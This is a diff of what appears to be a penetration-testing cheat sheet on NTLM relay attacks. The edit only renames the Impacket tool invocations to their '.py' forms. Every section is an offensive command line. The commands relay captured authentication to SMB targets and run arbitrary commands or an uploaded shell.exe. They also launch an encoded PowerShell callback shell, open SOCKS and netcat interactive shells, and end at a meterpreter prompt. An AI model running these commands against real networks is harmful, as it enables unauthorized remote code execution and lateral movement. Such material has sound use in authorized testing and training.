@@ -7,19 +7,19 @@
 TODO: Fill more info
 
 ```
-$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -c <commands>
+$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -c <commands>
 
-$ sudo ntlmrelayx -tf targets.txt -smb2support -c <commands>
+$ sudo ntlmrelayx.py -tf targets.txt -smb2support -c <commands>
 
-$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
+$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -e shell.exe
 
-$ sudo ntlmrelayx -tf targets.txt -smb2support -e shell.exe
+$ sudo ntlmrelayx.py -tf targets.txt -smb2support -e shell.exe
 ```
 
 - NTLM Relaying
 
 ```
-$ smbserver -smb2support -port 8445 share $(pwd)
+$ smbserver.py -smb2support -port 8445 share $(pwd)
 
 $ ntlmrelayx.py -tf targets.txt -smb2support --no-http-server --no-wcf-server --no-raw-server
 ```
@@ -27,7 +27,7 @@ $ ntlmrelayx.py -tf targets.txt -smb2support --no-http-server --no-wcf-server --
 - Interactive shell with netcat
 
 ```
-$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -socks
+$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -socks
 
 $ nc 127.0.0.1 <PORT>
 ```
@@ -54,15 +54,15 @@ HTTP=OFF
 Spawn callback shell
 
 ```
-$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
+$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -e shell.exe
 
-$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -c "powershell.exe -E <base64_encoded>"
+$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -c "powershell.exe -E <base64_encoded>"
 ```
 
 Interactive shell with netcat
 
 ```
-$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -i
+$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -i
 
 $ nc 127.0.0.1 <PORT>
 ```
@@ -74,7 +74,7 @@ $ nc 127.0.0.1 <PORT>
 - Disable SMB to spoof the targets via proxychains
 
 ```
-$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -socks
+$ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -socks
 
 meterpreter > shell
 
